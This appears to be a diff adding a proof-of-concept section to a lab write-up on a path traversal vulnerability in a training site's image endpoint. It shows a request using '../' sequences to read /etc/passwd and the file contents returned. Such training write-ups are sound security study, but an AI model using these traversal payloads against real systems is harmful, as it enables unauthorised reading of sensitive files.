@@ -35,6 +35,52 @@ This confirms that the application is vulnerable to **arbitrary file read**, as 
 
 ---
 
+### Proof of Concept (PoC)
+----------------------
+
+The image loading functionality can be abused to read sensitive system files.
+
+## Original Request
+
+A legitimate request for a product image:
+
+`GET /image?filename=53.jpg HTTP/2
+Host: <lab-id>.web-security-academy.net `
+
+This request returns the intended image file.
+
+---
+
+## Malicious Request
+
+The `filename` parameter was modified to include\
+[directory traversal sequences](https://owasp.org/www-community/attacks/Path_Traversal)\
+in order to access a sensitive\
+[system file](https://en.wikipedia.org/wiki/Unix_filesystem):
+
+`GET /image?filename=../../../../../../etc/passwd HTTP/2
+Host: <lab-id>.web-security-academy.net `
+
+---
+
+## Result
+
+The server responds with\
+HTTP 200 OK\
+and returns the contents of\
+[`/etc/passwd`](https://en.wikipedia.org/wiki/Passwd):
+
+`root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+carlos:x:12002:12002::/home/carlos:/bin/bash `
+
+This confirms that the application is vulnerable to\
+[arbitrary file read](https://portswigger.net/web-security/file-path-traversal),\
+as it discloses a sensitive system file that should never be accessible to users.
+
+---
+
 ## Impact
 
 Successful exploitation allows an attacker to:
